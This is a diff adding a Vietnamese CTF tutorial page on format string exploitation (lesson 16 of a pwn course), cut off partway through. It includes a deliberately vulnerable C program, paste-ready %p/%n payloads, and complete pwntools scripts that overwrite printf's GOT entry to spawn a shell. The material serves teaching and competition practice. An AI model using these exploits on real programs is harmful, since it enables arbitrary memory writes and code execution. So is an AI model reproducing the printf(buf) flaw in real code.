@@ -1,0 +1,518 @@
+<title>Format String</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap">
+<style>
+:root{
+  --bg:#f4f2ee;--surface:#fffdf9;--surface-2:#eceae3;--fg:#23211c;--muted:#6c675c;
+  --line:#d9d5cb;--accent:#b23a1e;--accent-soft:#f3dcd2;--ok:#2f7d4f;--ok-soft:#dcefe2;
+  --danger:#c0392b;--danger-soft:#f6ddd8;--warn:#b8860b;--warn-soft:#f3e7c7;
+  --mem:#3a6ea5;--mem-soft:#dce8f4;--code-bg:#1d1b17;--code-fg:#e8e4d8;
+  --font-head:"Space Grotesk",system-ui,sans-serif;--font-body:"Inter",system-ui,sans-serif;
+  --font-mono:"JetBrains Mono",ui-monospace,monospace;--maxw:740px;
+}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --danger:#e8705f;--danger-soft:#331c18;--warn:#d9b55f;--warn-soft:#2e2713;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}}
+:root[data-theme="dark"]{
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --danger:#e8705f;--danger-soft:#331c18;--warn:#d9b55f;--warn-soft:#2e2713;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}
+*{box-sizing:border-box}
+body{background:var(--bg);color:var(--fg);font-family:var(--font-body);line-height:1.68;font-size:16.5px;-webkit-font-smoothing:antialiased}
+.wrap{max-width:var(--maxw);margin:0 auto;padding-inline:max(18px,env(safe-area-inset-left,0px)) max(18px,env(safe-area-inset-right,0px))}
+.wide{max-width:1000px}
+header.hero{border-bottom:1px solid var(--line);background:linear-gradient(180deg,var(--surface),transparent)}
+.hero-inner{padding-block:42px 30px}
+.kicker{font-family:var(--font-mono);font-size:12.5px;letter-spacing:.13em;text-transform:uppercase;color:var(--accent);font-weight:700}
+h1{font-family:var(--font-head);font-weight:700;font-size:clamp(30px,6.5vw,48px);line-height:1.02;margin:.3em 0 .25em;letter-spacing:-.015em;word-break:break-word}
+.sub{color:var(--muted);font-size:17px;max-width:56ch}
+.meta-row{display:flex;flex-wrap:wrap;gap:8px;margin-top:18px}
+.chip{font-family:var(--font-mono);font-size:12px;padding:5px 10px;border:1px solid var(--line);border-radius:999px;background:var(--surface);color:var(--muted)}
+.chip b{color:var(--fg);font-weight:600}
+.toc{display:flex;flex-wrap:wrap;gap:6px;margin-top:18px}
+.toc a{font-family:var(--font-mono);font-size:11.5px;text-decoration:none;color:var(--muted);border:1px solid var(--line);padding:4px 9px;border-radius:7px;background:var(--surface)}
+.toc a:hover{color:var(--accent);border-color:var(--accent)}
+h2{font-family:var(--font-head);font-weight:700;font-size:clamp(22px,4vw,28px);letter-spacing:-.01em;margin:0 0 2px;text-wrap:balance}
+h3{font-family:var(--font-head);font-weight:600;font-size:19px;margin:26px 0 6px}
+h4{font-family:var(--font-head);font-weight:600;font-size:16px;margin:18px 0 4px}
+section.block{padding-block:34px;border-bottom:1px solid var(--line)}
+.secnum{font-family:var(--font-mono);font-size:12.5px;color:var(--accent);font-weight:700;letter-spacing:.09em}
+p{margin:12px 0}strong{font-weight:600}a{color:var(--accent);text-underline-offset:3px}
+.lead{font-size:18px}
+ul,ol{padding-left:22px;margin:12px 0}li{margin:7px 0}
+mark{background:var(--accent-soft);color:inherit;padding:0 4px;border-radius:3px;font-family:var(--font-mono);font-size:.9em}
+.mem-term{color:var(--mem);font-weight:600}
+.note{border-left:3px solid var(--accent);background:var(--surface);padding:13px 16px;border-radius:0 10px 10px 0;margin:18px 0;font-size:15px}
+.note.tip{border-color:var(--ok)}.note.warn{border-color:var(--danger)}
+.note .tag{font-family:var(--font-mono);font-size:11px;text-transform:uppercase;letter-spacing:.1em;color:var(--muted);font-weight:700;display:block;margin-bottom:3px}
+.tldr{background:var(--accent-soft);border:1px solid var(--line);border-radius:14px;padding:18px 20px}
+.tldr p{margin:6px 0}
+.combat{border:2px solid var(--accent);border-radius:14px;overflow:hidden;margin:4px 0 0}
+.combat-h{background:var(--accent);color:#fff;font-family:var(--font-head);font-weight:700;padding:10px 16px;font-size:15.5px}
+.combat-b{padding:2px 16px 10px;background:var(--surface)}
+.combat-row{padding:12px 0;border-bottom:1px solid var(--line)}
+.combat-row:last-child{border-bottom:none}
+.combat-row .lab{font-family:var(--font-mono);font-size:11px;font-weight:700;letter-spacing:.05em;color:var(--accent);text-transform:uppercase;margin-bottom:5px;display:block}
+.combat-row p{margin:0;font-size:14px}.combat-row pre{margin:4px 0 0}
+pre{background:var(--code-bg);color:var(--code-fg);font-family:var(--font-mono);font-size:13px;line-height:1.62;padding:16px;border-radius:12px;overflow-x:auto;margin:14px 0;border:1px solid #00000030}
+pre .c{color:#8a8574}pre .k{color:#e86a48}pre .s{color:#9cc591}pre .d{color:#7fb0e0}pre .p{color:#d9b55f}
+code{font-family:var(--font-mono);font-size:.88em;background:var(--surface-2);padding:1.5px 6px;border-radius:5px;word-break:break-word}
+pre code{background:none;padding:0;font-size:inherit}
+.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:12px;margin:16px 0}
+.card{background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:14px 16px}
+.card h4{margin:0 0 4px;font-size:15px}.card p{margin:0;font-size:14px;color:var(--muted)}
+.card .term{font-family:var(--font-mono);color:var(--accent);font-size:12.5px}
+.tablewrap{overflow-x:auto;-webkit-overflow-scrolling:touch;margin:14px 0}
+table{width:100%;border-collapse:collapse;font-size:14px;min-width:540px}
+th,td{text-align:left;padding:9px 12px;border-bottom:1px solid var(--line);vertical-align:top}
+th{font-family:var(--font-mono);font-size:11.5px;text-transform:uppercase;letter-spacing:.05em;color:var(--muted)}
+td code{font-size:.85em}
+.yes{color:var(--ok);font-weight:700}.no{color:var(--danger);font-weight:700}.maybe{color:var(--warn);font-weight:700}
+.lab{background:var(--surface);border:1px solid var(--line);border-radius:16px;padding:18px;margin:20px 0}
+.step{display:grid;grid-template-columns:32px 1fr;gap:13px;margin:16px 0}
+.step .n{font-family:var(--font-mono);font-weight:700;color:#fff;background:var(--accent);width:28px;height:28px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:13px}
+.step .body h4{margin:1px 0 4px}
+.tabs{display:flex;gap:6px;flex-wrap:wrap;margin:16px 0 0}
+.tab{font-family:var(--font-mono);font-size:12.5px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:8px 13px;border-radius:9px 9px 0 0;cursor:pointer;border-bottom:none}
+.tab.active{background:var(--code-bg);color:var(--code-fg);border-color:var(--code-bg)}
+.tabpanel pre{margin-top:0;border-top-left-radius:0}
+.frame{font-family:var(--font-mono);font-size:12px;display:flex;flex-direction:column;gap:3px;margin:12px 0}
+.fr{display:grid;grid-template-columns:90px 1fr;gap:8px;border:1px solid var(--line);border-radius:7px;padding:8px 10px;background:var(--surface-2)}
+.fr .o{color:var(--mem);white-space:nowrap}
+.fr.key{background:var(--accent-soft);border-color:var(--accent)}
+.reqitem{display:grid;grid-template-columns:30px 1fr;gap:10px;border:1px solid var(--line);border-radius:11px;padding:12px 14px;background:var(--surface);align-items:start;margin:8px 0}
+.reqitem .ico{font-size:17px;line-height:1.3}
+.reqitem h4{margin:0 0 2px;font-size:15px}.reqitem p{margin:0;font-size:14px;color:var(--muted)}
+/* stack reader */
+.sread{background:var(--surface-2);border:1px solid var(--line);border-radius:12px;padding:16px;margin:12px 0}
+.sread label{font-family:var(--font-mono);font-size:12px;color:var(--muted);display:block;margin-bottom:6px}
+.sread input{font-family:var(--font-mono);font-size:14px;padding:8px 11px;border:1px solid var(--line);border-radius:7px;background:var(--surface);color:var(--fg);width:120px}
+.sread .rows{margin-top:14px;font-family:var(--font-mono);font-size:12.5px;display:flex;flex-direction:column;gap:3px}
+.sread .r{display:grid;grid-template-columns:70px 160px 1fr;gap:8px;border:1px solid var(--line);border-radius:6px;padding:6px 9px;background:var(--surface)}
+.sread .r.hit{background:var(--accent-soft);border-color:var(--accent);font-weight:700}
+.sread .r .pos{color:var(--accent)}
+details{margin-top:8px;border:1px solid var(--line);border-radius:9px;padding:0 12px;background:var(--surface)}
+summary{cursor:pointer;font-size:14px;color:var(--muted);font-family:var(--font-mono);padding:10px 0}
+details[open] summary{color:var(--accent)}details .dc{padding-bottom:10px;font-size:14.5px}
+.ex{background:var(--surface);border:1px solid var(--line);border-left:3px solid var(--mem);border-radius:0 12px 12px 0;padding:13px 16px;margin:12px 0}
+.ex .level{font-family:var(--font-mono);font-size:11px;color:var(--mem);font-weight:700;letter-spacing:.06em}
+figure{margin:22px 0}figure.dg{border:1px solid var(--line);border-radius:14px;background:var(--surface);padding:16px 16px 6px}
+figure svg{display:block;max-width:100%;height:auto;margin:0 auto}
+figcaption{font-size:13px;color:var(--muted);text-align:center;margin-top:10px;line-height:1.55}
+.ttoggle{position:fixed;top:calc(10px + env(safe-area-inset-top,0px));right:calc(10px + env(safe-area-inset-right,0px));z-index:20;font-family:var(--font-mono);font-size:11px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:6px 10px;border-radius:999px;cursor:pointer}
+footer{padding-block:26px 44px;color:var(--muted);font-size:13.5px}
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:4px}
+@media(prefers-reduced-motion:reduce){*{transition:none!important}}
+</style>
+
+<button class="ttoggle" id="themeBtn" aria-label="Đổi giao diện">◐ giao diện</button>
+
+<header class="hero">
+  <div class="wrap hero-inner">
+    <div class="kicker">PWN · Phase 3 · Bài 16</div>
+    <h1>Format String</h1>
+    <p class="sub">Khi chương trình gọi <code>printf(buf)</code> với <code>buf</code> là input của bạn (không có <code>"%s"</code>): bạn <strong>kiểm soát chuỗi định dạng</strong>. <code>%p</code> đọc stack (leak canary/libc/PIE), <code>%n</code> ghi số byte đã in vào một địa chỉ → <mark>ghi tùy ý</mark>. Bài này đi <strong>số thật</strong>: dò offset, leak, rồi ghi GOT bằng <code>fmtstr_payload</code>.</p>
+    <div class="meta-row">
+      <span class="chip"><b>Mức:</b> Trung bình</span>
+      <span class="chip"><b>Binary mẫu:</b> x86-64 no-PIE, offset 6</span>
+      <span class="chip"><b>Cần trước:</b> stack, GOT</span>
+      <span class="chip"><b>Thời lượng:</b> ~55 phút</span>
+    </div>
+    <div class="toc">
+      <a href="#s0">00 Tóm tắt</a><a href="#combat">⚡ Combat</a><a href="#s1">01 Nền tảng</a><a href="#s2">02 Vì sao</a>
+      <a href="#s3">03 Đọc %p</a><a href="#s4">04 Ghi %n</a><a href="#s5">05 Stack reader</a><a href="#s6">06 Tự tìm</a>
+      <a href="#s7">07 Exploit thật</a><a href="#s8">08 Công cụ</a><a href="#s9">09 Gỡ lỗi</a>
+      <a href="#s10">10 Biến thể</a><a href="#s11">11 Bài tập</a><a href="#s12">12 Thuật ngữ</a>
+    </div>
+  </div>
+</header>
+
+<main>
+
+<!-- 00 -->
+<section class="block" id="s0">
+ <div class="wrap">
+  <div class="secnum">00 / TÓM TẮT 1 PHÚT</div>
+  <h2>Bài này nói về cái gì?</h2>
+  <div class="tldr">
+    <p><strong>Lỗi:</strong> <code>printf(buf)</code> thay vì <code>printf("%s", buf)</code>. <code>printf</code> đọc các specifier trong buf và lấy "đối số" từ <strong>thanh ghi + stack</strong> — nhưng không có đối số thật → nó đọc bừa dữ liệu đang có.</p>
+    <p><strong>Đọc (leak):</strong> <code>%p</code> in một "đối số" (8 byte). <code>%N$p</code> in đối số thứ N. Dò N tới khi thấy chuỗi của mình → biết offset tới buffer.</p>
+    <p><strong>Ghi:</strong> <code>%n</code> ghi <em>số byte đã in</em> vào địa chỉ (đối số). Kết hợp độ rộng <code>%100c</code> + <code>%hhn</code> → ghi từng byte → <mark>ghi tùy ý</mark>. pwntools <code>fmtstr_payload</code> dựng hộ.</p>
+  </div>
+  <p class="lead" style="margin-top:16px">Nếu chỉ nhớ một điều: <strong>%p để leak &amp; dò offset, %n để ghi — fmtstr_payload(offset, {addr: value}) làm phần ghi.</strong></p>
+ </div>
+</section>
+
+<!-- COMBAT -->
+<section class="block" id="combat">
+ <div class="wrap">
+  <div class="combat">
+    <div class="combat-h">⚡ COMBAT CARD — dán chạy khi đang thi</div>
+    <div class="combat-b">
+      <div class="combat-row"><span class="lab">🔎 Dò offset buffer</span>
+<pre><code>p.sendline(b"ABCD%p.%p.%p.%p.%p.%p.%p.%p")
+<span class="c"># tìm vị trí in ra 0x44434241 ("ABCD") → đó là offset. no-PIE hay gặp 6.</span>
+<span class="c"># hoặc nhanh:  %6$p  %7$p  ... tới khi ra chuỗi của mình</span></code></pre></div>
+      <div class="combat-row"><span class="lab">💧 Leak</span>
+<pre><code>%11$p  <span class="c"># thường là stack canary (byte cuối 00)</span>
+%21$p  <span class="c"># một địa chỉ libc (__libc_start_main+...) → tính base</span>
+<span class="c"># PIE: %p nào ra địa chỉ 0x55.... → base elf</span></code></pre></div>
+      <div class="combat-row"><span class="lab">🎯 Ghi (pwntools)</span>
+<pre><code>payload = fmtstr_payload(6, {exe.got.printf: exe.sym.win})
+p.sendline(payload)   <span class="c"># offset=6; GOT printf → win</span></code></pre></div>
+      <div class="combat-row"><span class="lab">🧮 Specifier chính</span>
+<pre><code>%p  đọc 8 byte (con trỏ)      %s  đọc chuỗi tại con trỏ (deref!)
+%n  ghi 4 byte = #đã in       %hn ghi 2 byte   %hhn ghi 1 byte
+%N$p đọc đối số thứ N         %Nc in N ký tự (tăng bộ đếm cho %n)</code></pre></div>
+      <div class="combat-row"><span class="lab">⚠️ Bẫy</span>
+        <p><b>Full RELRO</b> → GOT read-only, ghi GOT crash → nhắm <a href="exit_handlers.html">exit handler</a>/ret-addr/<code>__malloc_hook</code>. <code>%s</code> con trỏ xấu → crash. Ghi <code>%n</code> lớn tốn in rất nhiều → dùng <code>%hhn</code> từng byte. Chỉ 1 lần printf? dùng one-shot fmtstr.</p></div>
+    </div>
+  </div>
+ </div>
+</section>
+
+<!-- 01 -->
+<section class="block" id="s1">
+ <div class="wrap">
+  <div class="secnum">01 / NỀN TẢNG BẮT BUỘC</div>
+  <h2><code>printf</code> đọc đối số ở đâu</h2>
+  <p><code>printf(fmt, ...)</code> trên x86-64 SysV: <code>fmt</code> ở <code>rdi</code>; các đối số varargs lần lượt ở <code>rsi, rdx, rcx, r8, r9</code> rồi <strong>trên stack</strong>. Khi gặp một specifier (<code>%p</code>, <code>%d</code>…), printf lấy "đối số kế" theo thứ tự đó. Với <code>printf(buf)</code> — chỉ có 1 đối số thật (buf=rdi) — mọi <code>%p</code> sau sẽ <strong>đọc bừa</strong> rsi, rdx, ... rồi stack.</p>
+  <figure class="dg">
+  <svg viewBox="0 0 620 150" role="img" aria-label="printf lấy đối số từ rsi rdx rcx r8 r9 rồi stack; %6$p là ô stack đầu, thường là buffer" xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor">
+    <g font-family="monospace" font-size="10.5">
+    <rect x="20" y="20" width="80" height="24" rx="5" stroke-width="1.3"/><text x="60" y="36" text-anchor="middle" fill="var(--mem)" stroke="none">rdi=fmt</text>
+    <rect x="20" y="48" width="80" height="22" rx="5" stroke-width="1.2"/><text x="60" y="63" text-anchor="middle" fill="currentColor" stroke="none">%1$=rsi</text>
+    <rect x="20" y="72" width="80" height="22" rx="5" stroke-width="1.2"/><text x="60" y="87" text-anchor="middle" fill="currentColor" stroke="none">%2$=rdx</text>
+    <rect x="20" y="96" width="80" height="22" rx="5" stroke-width="1.2"/><text x="60" y="111" text-anchor="middle" fill="currentColor" stroke="none">%3$=rcx</text>
+    <rect x="120" y="48" width="80" height="22" rx="5" stroke-width="1.2"/><text x="160" y="63" text-anchor="middle" fill="currentColor" stroke="none">%4$=r8</text>
+    <rect x="120" y="72" width="80" height="22" rx="5" stroke-width="1.2"/><text x="160" y="87" text-anchor="middle" fill="currentColor" stroke="none">%5$=r9</text>
+    <rect x="240" y="48" width="140" height="22" rx="5" stroke-width="1.6" stroke="#e8663e"/><text x="310" y="63" text-anchor="middle" fill="#e8663e" stroke="none">%6$=[rsp] ← buffer</text>
+    <rect x="240" y="72" width="140" height="22" rx="5" stroke-width="1.2"/><text x="310" y="87" text-anchor="middle" fill="currentColor" stroke="none">%7$=[rsp+8]</text>
+    <rect x="240" y="96" width="140" height="22" rx="5" stroke-width="1.2"/><text x="310" y="111" text-anchor="middle" fill="currentColor" stroke="none">%8$=[rsp+16]</text>
+    <text x="500" y="70" font-size="11" fill="currentColor" stroke="none">reg (5) rồi</text>
+    <text x="500" y="86" font-size="11" fill="currentColor" stroke="none">tới stack.</text>
+    <text x="500" y="106" font-size="11" fill="#e8663e" stroke="none">buffer thường</text>
+    <text x="500" y="120" font-size="11" fill="#e8663e" stroke="none">ở %6$ (no-PIE).</text>
+    </g>
+  </svg>
+  <figcaption>%1$–%5$ là 5 thanh ghi; từ %6$ trở đi là stack. Buffer của bạn nằm trên stack → một %N$p nào đó in ra chính nó.</figcaption>
+  </figure>
+  <h4 style="margin-top:8px">Định nghĩa nhanh</h4>
+  <div class="grid">
+    <div class="card"><div class="term">format specifier</div><p>%p %d %s %n %c... — lệnh định dạng.</p></div>
+    <div class="card"><div class="term">offset</div><p>Vị trí %N$ mà printf đọc trúng buffer của bạn.</p></div>
+    <div class="card"><div class="term">%n</div><p>Ghi số byte ĐÃ IN vào địa chỉ (đối số).</p></div>
+    <div class="card"><div class="term">direct param access</div><p>%N$ — chọn thẳng đối số thứ N.</p></div>
+  </div>
+ </div>
+</section>
+
+<!-- 02 -->
+<section class="block" id="s2">
+ <div class="wrap">
+  <div class="secnum">02 / VÌ SAO CÓ KỸ THUẬT</div>
+  <h2>printf tin tưởng chuỗi định dạng</h2>
+  <p><code>printf</code> coi tham số đầu là "chương trình nhỏ" mô tả phải in gì &amp; lấy đối số ở đâu. Khi attacker kiểm soát chuỗi đó, họ điều khiển cả việc <em>đọc</em> (specifier không có đối số thật → đọc bừa bộ nhớ = leak) lẫn <em>ghi</em> (<code>%n</code> ghi ngược vào bộ nhớ). Một lỗi 2 ký tự (<code>printf(buf)</code> thiếu <code>"%s"</code>) biến thành <strong>đọc-ghi tùy ý</strong> — một trong các nguyên thủy mạnh nhất, thường đủ để chiếm luồng ngay cả khi có canary/PIE (vì leak được cả hai).</p>
+ </div>
+</section>
+
+<!-- 03 Đọc -->
+<section class="block" id="s3">
+ <div class="wrap">
+  <div class="secnum">03 / ĐỌC %p · MỤC LÕI</div>
+  <h2>Leak &amp; dò offset (số thật)</h2>
+  <p>Gửi chuỗi đánh dấu + nhiều <code>%p</code>, xem vị trí nào in ra chính chuỗi đánh dấu:</p>
+  <pre><code><span class="c"># gửi: "ABCDEFGH" + ".%p"*10</span>
+<span class="c"># output (binary no-PIE, canary on):</span>
+ABCDEFGH.0x7fffffffe0a0.0x7f....5190.0x1.0x7f....9887.(nil)
+        .<span class="d">0x4847464544434241</span>.0x7fffffffe200. ...
+<span class="c">#        └ "ABCDEFGH" = 0x4847464544434241 → đây là vị trí thứ 6 → OFFSET=6</span></code></pre>
+  <h3>Các leak hay dùng (binary mẫu)</h3>
+  <div class="tablewrap"><table>
+    <thead><tr><th>Payload</th><th>In ra (ví dụ)</th><th>Ý nghĩa</th></tr></thead>
+    <tbody>
+      <tr><td><code>%6$p</code></td><td><code>0x4847464544434241</code></td><td>Chính buffer → xác nhận offset=6</td></tr>
+      <tr><td><code>%11$p</code></td><td><code>0x6a3b...00</code> (cuối 00)</td><td>Stack canary (8 byte, byte thấp 0x00)</td></tr>
+      <tr><td><code>%21$p</code></td><td><code>0x7ffff7dcf083</code></td><td>__libc_start_main+243 → libc base = leak − 0x24083</td></tr>
+      <tr><td><code>%15$p</code></td><td><code>0x555555555189</code></td><td>Một địa chỉ ELF (PIE) → tính PIE base</td></tr>
+    </tbody>
+  </table></div>
+  <div class="note tip"><span class="tag">Vị trí leak = thử</span>Các số 11/21/15 ở trên là <em>ví dụ của binary mẫu</em> — mỗi binary khác. Gửi <code>%1$p</code>…<code>%30$p</code> một lần, đối chiếu giá trị (canary cuối 00, libc 0x7f…, stack 0x7fff…, PIE 0x55…) để biết vị trí nào là gì.</div>
+ </div>
+</section>
+
+<!-- 04 Ghi -->
+<section class="block" id="s4">
+ <div class="wrap">
+  <div class="secnum">04 / GHI %n</div>
+  <h2>Ghi tùy ý qua số byte đã in</h2>
+  <p><code>%n</code> ghi <strong>số ký tự đã in tới thời điểm đó</strong> vào địa chỉ (đối số). Kỹ thuật: (1) đặt <em>địa chỉ đích</em> vào buffer tại một ô stack đã biết offset; (2) in đúng số ký tự = giá trị cần ghi; (3) <code>%n</code> trỏ tới ô đó.</p>
+  <h3>Bảng-byte: payload ghi 1 byte (số thật)</h3>
+  <p>Ghi <code>0x42</code> (66) vào <code>0x404018</code> (GOT), offset buffer = 6:</p>
+  <div class="frame">
+    <div class="fr"><span class="o">%66c</span><span>in 66 ký tự → bộ đếm = 66 = 0x42</span></div>
+    <div class="fr key"><span class="o">%8$hhn</span><span>ghi 1 byte (0x42) vào đối số thứ 8 = ô chứa địa chỉ</span></div>
+    <div class="fr"><span class="o">[padding]</span><span>căn cho địa chỉ rơi đúng ô 8</span></div>
+    <div class="fr key"><span class="o">p64(0x404018)</span><span>địa chỉ đích đặt tại ô stack thứ 8</span></div>
+  </div>
+  <pre><code><span class="c"># thủ công (khó căn) — thực chiến dùng fmtstr_payload:</span>
+payload = b<span class="s">"%66c%8$hhn"</span>.ljust(<span class="d">16</span>, b<span class="s">"A"</span>) + p64(<span class="d">0x404018</span>)
+<span class="c"># %hhn = 1 byte ; %hn = 2 byte ; %n = 4 byte. Ghi địa chỉ 8 byte = 8× %hhn.</span></code></pre>
+  <div class="note tip"><span class="tag">Vì sao %hhn từng byte</span>Ghi cả 8 byte địa chỉ bằng một <code>%n</code> cần in ~<code>địa_chỉ</code> ký tự (hàng tỉ) — bất khả. Nên ghi <strong>từng byte</strong> bằng <code>%hhn</code>: in thêm chút ký tự để bộ đếm đạt byte mong muốn, lần lượt 8 byte. <code>fmtstr_payload</code> sắp xếp thứ tự byte tăng dần để tối thiểu số ký tự in.</div>
+ </div>
+</section>
+
+<!-- 05 Stack reader -->
+<section class="block" id="s5">
+ <div class="wrap wide">
+  <div class="secnum">05 / TỰ TAY THỬ</div>
+  <h2>Trình đọc stack %N$p (dò offset)</h2>
+  <p>Mô phỏng stack khi gọi <code>printf(buf)</code> với <code>buf="ABCDEFGH...."</code>. Nhập N → xem <code>%N$p</code> in ra gì; tìm N cho ra "ABCDEFGH".</p>
+  <div class="lab">
+    <div class="sread">
+      <label>N (số thứ tự đối số):</label>
+      <input id="nIn" value="6" inputmode="numeric">
+      <div class="rows" id="rows"></div>
+    </div>
+    <p class="lab-sub">%1–%5 = rsi/rdx/rcx/r8/r9 (reg). Từ %6 là stack; buffer "ABCDEFGH" nằm ở %6 trong mô phỏng này → offset=6.</p>
+  </div>
+ </div>
+</section>
+
+<!-- 06 Tự tìm -->
+<section class="block" id="s6">
+ <div class="wrap">
+  <div class="secnum">06 / TỰ TÌM THÔNG TIN</div>
+  <h2>Xác định offset, canary, libc</h2>
+  <div class="step"><div class="n">1</div><div class="body"><h4>Offset buffer</h4>
+    <pre><code><span class="c"># gửi "AAAAAAAA" + "%p"*20 ; tìm 0x4141414141414141</span>
+<span class="c"># pwntools: FmtStr(exec_fmt) tự dò offset</span></code></pre></div></div>
+  <div class="step"><div class="n">2</div><div class="body"><h4>Nhận diện giá trị leak</h4>
+    <pre><code><span class="c"># 0x7fff... = stack ; 0x7f.... = libc/mmap ; 0x55.... = PIE ; cuối 00 = canary</span></code></pre></div></div>
+  <div class="step"><div class="n">3</div><div class="body"><h4>Tính offset libc</h4>
+    <pre><code><span class="p">pwndbg&gt;</span> p/x &lt;leak&gt; - libc_base   <span class="c"># vd __libc_start_main+243 → base = leak-0x24083</span></code></pre></div></div>
+ </div>
+</section>
+
+<!-- 07 Exploit thật -->
+<section class="block" id="s7">
+ <div class="wrap wide">
+  <div class="secnum">07 / EXPLOIT ĐẦY ĐỦ</div>
+  <h2>printf lặp → leak → ghi GOT → win</h2>
+  <pre><code><span class="c">// vuln.c — gcc vuln.c -o vuln -no-pie -fstack-protector  (Partial RELRO, có canary)</span>
+<span class="k">void</span> win(){ system(<span class="s">"/bin/sh"</span>); }
+<span class="k">int</span> main(){ <span class="k">char</span> buf[<span class="d">0x100</span>];
+  <span class="k">for</span>(<span class="k">int</span> i=<span class="d">0</span>;i&lt;<span class="d">3</span>;i++){ fgets(buf,<span class="d">0x100</span>,stdin); printf(buf); }   <span class="c">// fmt, 3 lần</span>
+}</code></pre>
+  <div class="tabs" id="tabs">
+    <button class="tab active" data-t="a">A · thủ công</button>
+    <button class="tab" data-t="b">B · fmtstr_payload</button>
+    <button class="tab" data-t="c">C · pwnld/FmtStr</button>
+  </div>
+
+  <div class="tabpanel" id="panel-a">
+<pre><code><span class="c"># BẢN A — dò offset tay, ghi GOT printf → win bằng %hhn.</span>
+<span class="k">from</span> pwn <span class="k">import</span> *
+exe = ELF(<span class="s">"./vuln"</span>, checksec=<span class="k">False</span>)
+p = process(exe.path)
+
+<span class="c"># vòng 1: xác nhận offset = 6</span>
+p.sendline(b<span class="s">"AAAAAAAA.%6$p"</span>)
+print(p.recvline())            <span class="c"># → ...0x4141414141414141 ⇒ offset 6</span>
+
+<span class="c"># vòng 2: ghi GOT['printf'] = win (no-PIE → địa chỉ cố định)</span>
+win  = exe.sym.win             <span class="c"># vd 0x401196</span>
+got  = exe.got.printf          <span class="c"># vd 0x404018</span>
+<span class="c"># ghi 2 byte thấp của win (thường đủ vì cùng 0x40xxxx) bằng %hn:</span>
+val  = win &amp; 0xffff            <span class="c"># 0x1196 = 4502</span>
+payload = f<span class="s">"%{val}c%8$hn"</span>.encode().ljust(<span class="d">16</span>, b<span class="s">"A"</span>) + p64(got)
+p.sendline(payload)            <span class="c"># offset 6 là địa chỉ-liệt; ô chứa got là %8 (6+2 padding)</span>
+
+<span class="c"># vòng 3: gọi printf lần nữa → nhảy win → shell</span>
+p.sendline(b<span class="s">"id"</span>)
+p.interactive()</code></pre>
+<div class="note warn"><span class="tag">Thành thật</span>Căn ô (<code>%8$</code> vs <code>%6$</code>) tùy cách payload nằm trên stack: địa chỉ phải rơi đúng ô mà printf đọc. Thực chiến dùng <code>fmtstr_payload</code> (bản B) để khỏi căn tay. Số <code>win=0x401196</code>, <code>got=0x404018</code> là ví dụ no-PIE — của bạn khác.</div>
+  </div>
+
+  <div class="tabpanel" id="panel-b" hidden>
+<pre><code><span class="c"># BẢN B — pwntools fmtstr_payload lo hết căn byte.</span>
+<span class="k">from</span> pwn <span class="k">import</span> *
+context.binary = exe = ELF(<span class="s">"./vuln"</span>, checksec=<span class="k">False</span>)
+p = process(exe.path)
+
+OFFSET = <span class="d">6</span>
+<span class="c"># ghi đầy đủ GOT printf = win (fmtstr_payload tự chia %hhn từng byte):</span>
+payload = fmtstr_payload(OFFSET, {exe.got.printf: exe.sym.win})
+p.sendline(payload)            <span class="c"># vòng này in rất nhiều ký tự — bình thường</span>
+p.sendline(b<span class="s">"id"</span>)              <span class="c"># printf kế → win()</span>
+p.interactive()</code></pre>
+<div class="note tip"><span class="tag">Full RELRO?</span>Nếu GOT read-only: đổi đích sang <code>exe.sym.__stack_chk_fail</code> không được (cũng GOT), dùng <b>return address trên stack</b> (leak stack trước), hoặc <a href="exit_handlers.html">__exit_funcs</a> / <code>libc.sym.__malloc_hook</code>. <code>fmtstr_payload(OFFSET, {ret_addr: win})</code>.</div>
+  </div>
+
+  <div class="tabpanel" id="panel-c" hidden>
+<pre><code><span class="c"># BẢN C — pwntools FmtStr tự dò offset + ghi; hoặc pwnld fmtstr_pos.</span>
+<span class="k">from</span> pwn <span class="k">import</span> *
+context.binary = exe = ELF(<span class="s">"./vuln"</span>, checksec=<span class="k">False</span>)
+
+<span class="k">def</span> send(payload):
+    p = process(exe.path); p.sendline(payload)
+    <span class="k">return</span> p.recvall()
+fmt = FmtStr(execute_fmt=send)   <span class="c"># tự dò offset</span>
+log.info(<span class="s">f"offset = {fmt.offset}"</span>)
+fmt.write(exe.got.printf, exe.sym.win)
+fmt.execute_writes()
+<span class="c"># pwnld: pos = fmtstr_pos(p)  rồi  fmtstr_payload(pos, {...})</span></code></pre>
+<div class="note"><span class="tag">pwntools</span><code>FmtStr(execute_fmt)</code> tự dò offset &amp; dồn nhiều lần ghi. Dùng khi có thể gọi fmt nhiều lần. pwnld <code>fmtstr_pos</code> trả offset tự động.</div>
+  </div>
+
+  <h3>Checklist</h3>
+  <div class="reqitem"><span class="ico">🔎</span><div><h4>Ghi GOT crash</h4><p>Full RELRO. Đổi đích ret-addr/exit handler/hook.</p></div></div>
+  <div class="reqitem"><span class="ico">🔎</span><div><h4>Chỉ 1 lần printf</h4><p>Phải leak + ghi trong 1 payload (one-shot). Khó hơn; fmtstr_payload vẫn làm được nếu đủ độ dài.</p></div></div>
